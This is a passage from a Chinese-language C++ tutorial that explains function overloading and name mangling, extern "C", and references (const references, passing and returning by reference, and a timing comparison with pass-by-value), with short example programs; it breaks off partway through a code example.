<p>重载函数通常用来命名一组功能相似的函数，这样做减少了函数名的数量，避免了名字空间的污染，对于程序的可读性有很大的好处。</p> 
<p>例如函数 <code>Test(int a, float b)</code> 的参数列表是 <code>(int, float)</code>，它与函数 <code>Test(float a, int b)</code>参数列表 <code>(float, int)</code>不同，这就是函数重载。</p> 
<blockquote> 
 <p>函数重载是编译时多态。</p> 
</blockquote> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">Test</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">double</span> <span class="token function">Test</span><span class="token punctuation">(</span><span class="token keyword">double</span> a<span class="token punctuation">,</span> <span class="token keyword">double</span> b<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">double</span> <span class="token function">Test</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">double</span> b<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token function">Test</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token function">Test</span><span class="token punctuation">(</span><span class="token number">5.5</span><span class="token punctuation">,</span> <span class="token number">5.5</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token function">Test</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">5.5</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><font color="#2E8B57">运行结果</font><br> <img src="https://images2.imgbox.com/4d/2f/G1OS18vS_o.png" alt="在这里插入图片描述"></p> 
<blockquote> 
 <p>注意：形参列表不同是指参数个数、参数类型或者参数顺序不同，若仅仅是返回类型不同，则不能构成重载。</p> 
</blockquote> 
<h2>
<a id="__434"></a>? 函数重载原理</h2> 
<blockquote> 
 <p>为什么 <strong>C++</strong> 支持函数重载，而 <strong>C</strong> 语言不支持函数重载呢？</p> 
</blockquote> 
<p>首先，我们知道在 <strong>C/C++</strong> 中，一个程序要运行起来，需要经历以下几个阶段：<strong>预处理、编译、汇编、链接。</strong>（<strong>如下图所示?</strong>）<br> <img src="https://images2.imgbox.com/6b/89/OsVM4z2q_o.png" alt="在这里插入图片描述"></p> 
<blockquote> 
 <p>1）编译阶段会将程序中的每个源文件的全局范围的变量符号分别进行汇总。<br>  <br> 2）在汇编阶段会给每个源文件汇总出来的符号分配一个地址（若符号只是一个声明，则给其分配一个无意义的地址），然后分别生成一个符号表。<br>  <br> 3）最后在链接期间会将每个源文件的符号表进行合并，若不同源文件的符号表中出现了相同的符号，则取合法的地址为合并后的地址（重定位）。<br>  <br> 在 <strong>C</strong> 语言中，汇编阶段进行符号汇总时，一个函数汇总后的符号就是其函数名，所以当汇总时发现多个相同的函数符号时，编译器便会报错。<br>  <br> 而 <strong>C++</strong> 在进行符号汇总时，对函数的名字修饰做了改动，函数汇总出的符号不再单单是函数的函数名，而是通过其参数的类型和个数以及顺序等信息汇总出一个符号，这样一来，就算是函数名相同的函数，只要其参数的类型或参数的个数或参数的顺序不同，那么汇总出来的符号也就不同了。</p> 
</blockquote> 
<p><strong>总结：</strong></p> 
<blockquote> 
 <p>1）<strong>C</strong> 语言不能支持重载，是因为同名函数没办法区分。而 <strong>C++</strong> 是通过函数修饰规则来区分的，只要函数的形参列表不同，修饰出来的名字就不一样，也就支持了重载。<br>  <br> 2）另外我们也理解了，为什么函数重载要求参数不同，根返回值没关系。</p> 
</blockquote> 
<h2>
<a id="_extern_C_457"></a>? extern “C”</h2> 
<p>有时候在 <strong>cpp</strong> 工程中可能需要将某些函数按照 <strong>C</strong> 的风格来编译，在函数前加 <code>extern "C"</code>。</p> 
<p>意思是 <strong>告诉编译器，将该函数按照 C 语言规则来编译。</strong></p> 
<p>比如：<strong>tcmalloc</strong> 是 <strong>google</strong> 用 <strong>C++</strong> 实现的一个项目，他提供 <code>tcmallc()</code> 和 <code>tcfree()</code> 两个接口来使用，但如果是 <strong>C</strong> 项目就没办法使用，那么他就使用 <code>extern "C"</code> 来解决。</p> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token keyword">extern</span> <span class="token string">"C"</span> <span class="token keyword">int</span> <span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">int</span> left<span class="token punctuation">,</span> <span class="token keyword">int</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token function">Add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><strong>总结：</strong></p> 
<blockquote> 
 <p><strong>C++</strong> 项目可以调用 <strong>C++</strong> 库，也可以调用 <strong>C</strong> 的库，<strong>C++</strong> 是直接兼容 <strong>C</strong> 的。<br>  <br> <strong>C</strong> 项目可以调用 <strong>C</strong> 库，也可以使用 <code>extern "C"</code> 调用 <strong>C++</strong> 库 (<strong>C++</strong> 提供的函数加上 <code>extern "C"</code>)</p> 
</blockquote> 
<h1>
<a id="6__481"></a>6. 引用</h1> 
<h2>
<a id="__482"></a>? 引用的概念</h2> 
<p><strong>引用</strong> 不是新定义一个变量，而 <strong>是给已存在变量取了一个别名</strong>，编译器不会为引用变量开辟内存空间，它和它引用的变量 <strong>共用同一块内存空间</strong>。</p> 
<p>使用的基本形式为：<code>类型&amp; 引用变量名(对象名) = 引用实体</code>。</p> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span><span class="token operator">&amp;</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span> <span class="token comment">//给变量a取了一个别名，叫b</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"a = "</span> <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// a打印结果为10</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"b = "</span> <span class="token operator">&lt;&lt;</span> b <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// b打印结果也是10</span>
	
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>

	b <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span> <span class="token comment">// 改变b也就是改变了a</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"a = "</span> <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// a打印结果为20</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"b = "</span> <span class="token operator">&lt;&lt;</span> b <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// b打印结果也是为20</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><font color="#2E8B57">运行结果</font><br> <img src="https://images2.imgbox.com/bd/b5/spTMtXhZ_o.png" alt="在这里插入图片描述"></p> 
<blockquote> 
 <p>注意：引用类型必须和引用实体是同种类型的。</p> 
</blockquote> 
<h2>
<a id="__512"></a>? 引用的特性</h2> 
<p><strong>（1）引用在定义时必须初始化</strong></p> 
<p>错误用法：</p> 
<pre><code class="prism language-cpp"><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
<span class="token keyword">int</span><span class="token operator">&amp;</span> b<span class="token punctuation">;</span> <span class="token comment">// 定义b时，没有进行初始化</span>
b <span class="token operator">=</span> a<span class="token punctuation">;</span>
</code></pre> 
<p>正确用法：</p> 
<pre><code class="prism language-cpp"><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
<span class="token keyword">int</span><span class="token operator">&amp;</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span> <span class="token comment">// 定义时必须初始化</span>
</code></pre> 
<p><strong>（2）一个变量可以有多个引用</strong></p> 
<pre><code class="prism language-cpp"><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
<span class="token keyword">int</span><span class="token operator">&amp;</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span>
<span class="token keyword">int</span><span class="token operator">&amp;</span> c <span class="token operator">=</span> a<span class="token punctuation">;</span>
<span class="token keyword">int</span><span class="token operator">&amp;</span> d <span class="token operator">=</span> a<span class="token punctuation">;</span>
</code></pre> 
<blockquote> 
 <p>此时，<strong>b</strong>、<strong>c</strong>、<strong>d</strong> 都是变量 <strong>a</strong> 的引用。</p> 
</blockquote> 
<p><strong>（3）引用一旦引用一个实体，再不能引用其他实体</strong></p> 
<p>创建一个 <strong>变量 a</strong>，再创建一个 <strong>变量 b</strong>，<strong>b</strong> 是 <strong>a</strong> 的引用。</p> 
<pre><code class="prism language-cpp"><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
<span class="token keyword">int</span><span class="token operator">&amp;</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span>
</code></pre> 
<p>那么我再创建一个变量 <strong>c</strong>，想让 <strong>b</strong> 成为 <strong>c</strong> 的引用。</p> 
<pre><code class="prism language-cpp"><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
<span class="token keyword">int</span><span class="token operator">&amp;</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span>

<span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>
b <span class="token operator">=</span> c<span class="token punctuation">;</span>
</code></pre> 
<p><strong>注意：此时，b 已经是 a 的引用了，b 不能再引用其他实体</strong>，它是意思是，将 <strong>b</strong> 引用的实体赋值为 <strong>c</strong>，也就是将变量 <strong>a</strong> 的内容改成了 <strong>20</strong>。</p> 
<p><font color="#2E8B57">运行结果</font><br> <img src="https://images2.imgbox.com/f2/e7/wLyow482_o.png" alt="在这里插入图片描述"></p> 
<h2>
<a id="__558"></a>? 常引用</h2> 
<p>引用类型必须和引用实体是同种类型的。</p> 
<p>但是仅仅是同种类型，还不能保证能够引用成功，我们若用一个普通引用类型去引用一个被 <strong>const</strong> 所修饰的类型，那么引用将不会成功。</p> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">const</span> <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span><span class="token operator">&amp;</span> ra <span class="token operator">=</span> a<span class="token punctuation">;</span> <span class="token comment">// 该语句编译时会出错，a为常量，由const int到int</span>
	<span class="token keyword">const</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> ra <span class="token operator">=</span> a<span class="token punctuation">;</span> <span class="token comment">// 这才是正确写法</span>

	<span class="token keyword">int</span><span class="token operator">&amp;</span> b <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span> <span class="token comment">// 该语句编译时会出错，10为常量</span>
	<span class="token keyword">const</span> <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span> <span class="token comment">// 正确写法</span>

	<span class="token keyword">double</span> d <span class="token operator">=</span> <span class="token number">12.34</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span><span class="token operator">&amp;</span> rd <span class="token operator">=</span> d<span class="token punctuation">;</span> <span class="token comment">// 该语句编译时会出错，类型不同</span>
	<span class="token keyword">const</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> rd <span class="token operator">=</span> d<span class="token punctuation">;</span> <span class="token comment">//正确写法</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><strong>总结：</strong></p> 
<blockquote> 
 <p><strong>const</strong> 引用的好处是保护实参，避免被误改，且它可以传普通对象也可以传 <strong>const</strong> 对象。<br>  <br> 函数传参如果想减少拷贝使用引用传参，如果函数中不改变这个参数最好使用 <strong>const</strong> 引用传参。</p> 
</blockquote> 
<h2>
<a id="__589"></a>? 使用场景</h2> 
<p><strong>（1）做参数</strong></p> 
<blockquote> 
 <p>在 <strong>C</strong> 语言中，我们学习过 <strong>交换函数</strong>，当时深入剖析了 <strong>传值</strong> 和 <strong>传址</strong>。<br>  <br> 现在我们学习了引用，可以不用 <strong>传址</strong> 了。</p> 
</blockquote> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">Swap1</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span> p1<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">*</span> p2<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> temp <span class="token operator">=</span> <span class="token operator">*</span>p1<span class="token punctuation">;</span>
	<span class="token operator">*</span>p1 <span class="token operator">=</span> <span class="token operator">*</span>p2<span class="token punctuation">;</span>
	<span class="token operator">*</span>p2 <span class="token operator">=</span> temp<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">Swap2</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">&amp;</span> rx<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> ry<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> temp <span class="token operator">=</span> rx<span class="token punctuation">;</span>
	rx <span class="token operator">=</span> ry<span class="token punctuation">;</span>
	ry <span class="token operator">=</span> temp<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span> y <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>

	<span class="token function">Swap1</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>x<span class="token punctuation">,</span> <span class="token operator">&amp;</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// C传参</span>
	<span class="token function">Swap2</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// C++传参</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<blockquote> 
 <p>因为这里 <strong>rx</strong> 和 <strong>ry</strong> 是传入实参的引用，我们将 <strong>x</strong> 和 <strong>y</strong> 的值交换，就相当于将传入的两个实参交换了。</p> 
</blockquote> 
<p><strong>（2）做返回值</strong></p> 
<blockquote> 
 <p>引用还可以做返回值。<br>  <br> 但是要特别注意，我们返回的数据不能是函数内部创建的普通局部变量，因为在函数内部定义的普通的局部变量会随着函数调用的结束而被销毁。<br>  <br> 我们返回的数据必须是被 <strong>static</strong> 修饰，或者是动态开辟的，再或者是全局变量等…不会随着函数调用的结束而被销毁的数据。</p> 
</blockquote> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token keyword">int</span><span class="token operator">&amp;</span> <span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">static</span> <span class="token keyword">int</span> c <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>
	<span class="token keyword">return</span> c<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><strong>注意：</strong></p> 
<blockquote> 
 <p>如果函数返回时，出了函数作用域，返回对象还未还给系统，则可以使用引用返回；<br>  <br> 如果已经还给系统了，则必须使用传值返回。</p> 
</blockquote> 
<h2>
<a id="__645"></a>? 传值、传引用效率比较</h2> 
<p>以值作为参数或者返回值类型，在传参和返回期间，函数不会直接传递实参或者将变量本身直接返回，而是传递实参或者返回变量的一份临时的拷贝。</p> 
<p>我这里写了个程序，可以用来测量 <strong>传值</strong> 和 <strong>传引用</strong> 的效率。</p> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;time.h&gt;</span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">A</span> <span class="token punctuation">{<!-- --></span> 
	<span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">10000</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span><span class="token punctuation">;</span>

A a<span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">TestFunc1</span><span class="token punctuation">(</span>A a<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">TestFunc2</span><span class="token punctuation">(</span>A<span class="token operator">&amp;</span> a<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">TestRefAndValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	A a<span class="token punctuation">;</span>

	<span class="token comment">// 以值作为函数参数</span>
	size_t begin1 <span class="token operator">=</span> <span class="token function">clock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span>size_t i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10000</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
		<span class="token function">TestFunc1</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	size_t end1 <span class="token operator">=</span> <span class="token function">clock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// 以引用作为函数参数</span>
	size_t begin2 <span class="token operator">=</span> <span class="token function">clock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span>size_t i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10000</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
		<span class="token function">TestFunc2</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	size_t end2 <span class="token operator">=</span> <span class="token function">clock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// 分别计算两个函数运行结束后的时间</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"TestFunc1(A)-time:"</span> <span class="token operator">&lt;&lt;</span> end1 <span class="token operator">-</span> begin1 <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"TestFunc2(A&amp;)-time:"</span> <span class="token operator">&lt;&lt;</span> end2 <span class="token operator">-</span> begin2 <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token comment">//传值、传引用效率比较</span>
	<span class="token function">TestRefAndValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><font color="#2E8B57">运行结果</font><br> <img src="https://images2.imgbox.com/a8/5e/eji2ACMe_o.png" alt="在这里插入图片描述"></p> 
<blockquote> 
 <p>可以看到，用值作为参数或者返回值类型，效率是非常低下的，尤其是当参数或者返回值类型非常大时，效率就更低。</p> 
</blockquote> 
<h2>
<a id="__702"></a>? 值和引用的作为返回值类型的性能比较</h2> 
<p>我们再来比较一下值和引用的作为返回值类型的性能。</p> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;time.h&gt;</span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">A</span> <span class="token punctuation">{<!-- --></span> 
	<span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">10000</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span><span class="token punctuation">;</span>

A a<span class="token punctuation">;</span>

A <span class="token function">TestFunc3</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> 
	<span class="token keyword">return</span> a<span class="token punctuation">;</span> 
<span class="token punctuation">}</span>

A<span class="token operator">&amp;</span> <span class="token function">TestFunc4</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> 
	<span class="token keyword">return</span> a<span class="token punctuation">;</span> 
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">TestReturnByRefOrValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token comment">// 以值作为函数的返回值类型</span>
	size_t begin1 <span class="token operator">=</span> <span class="token function">clock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span>size_t i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100000</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
		<span class="token function">TestFunc3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	size_t end1 <span class="token operator">=</span> <span class="token function">clock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// 以引用作为函数的返回值类型</span>
	size_t begin2 <span class="token operator">=</span> <span class="token function">clock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span>size_t i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100000</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
		<span class="token function">TestFunc4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	size_t end2 <span class="token operator">=</span> <span class="token function">clock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// 计算两个函数运算完成之后的时间</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"A TestFunc3 time:"</span> <span class="token operator">&lt;&lt;</span> end1 <span class="token operator">-</span> begin1 <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"A&amp; TestFunc4 time:"</span> <span class="token operator">&lt;&lt;</span> end2 <span class="token operator">-</span> begin2 <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token comment">//值和引用作为返回值类型的性能比较</span>
	<span class="token function">TestReturnByRefOrValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><font color="#2E8B57">运行结果</font><br> <img src="https://images2.imgbox.com/20/5e/e4sqXOkN_o.png" alt="在这里插入图片描述"></p> 
<blockquote> 
 <p>明显，<strong>引用</strong> 的性能更优于 <strong>值</strong>。</p> 
</blockquote> 
<p><strong>总结：</strong></p> 
<blockquote> 
 <p>可以发现发现 <strong>传值</strong> 和 <strong>指针</strong> 在作为 <strong>传参</strong> 以及 <strong>返回值类型</strong> 上效率相差很大。</p> 
</blockquote> 
<h2>
<a id="__761"></a>? 引用和指针的区别</h2> 
<p>在语法概念上，引用就是一个别名，没有独立空间，和其引用实体共用同一块空间。</p> 
<p>而指针变量是开辟一块空间，存储变量的地址。</p> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span><span class="token operator">&amp;</span> ra <span class="token operator">=</span> a<span class="token punctuation">;</span>

	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"&amp;a = "</span> <span class="token operator">&lt;&lt;</span> <span class="token operator">&amp;</span>a <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"&amp;ra = "</span> <span class="token operator">&lt;&lt;</span> <span class="token operator">&amp;</span>ra <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><font color="#2E8B57">运行结果</font><br> <img src="https://images2.imgbox.com/35/6c/ZRl1Qh0o_o.png" alt="在这里插入图片描述"></p> 
<p>可以看到 <strong>a</strong> 和它的引用 <strong>b</strong> 地址是一样的。</p> 
<p>但是，<strong>在底层实现上实际是有空间的，因为引用是按照指针方式来实现的。</strong></p> 
<p><font color="#4169E1">? 代码示例</font></p> 
<pre><code class="prism language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>

	<span class="token comment">// 语法上，给a这块空间取了一个别名，没有新开空间</span>
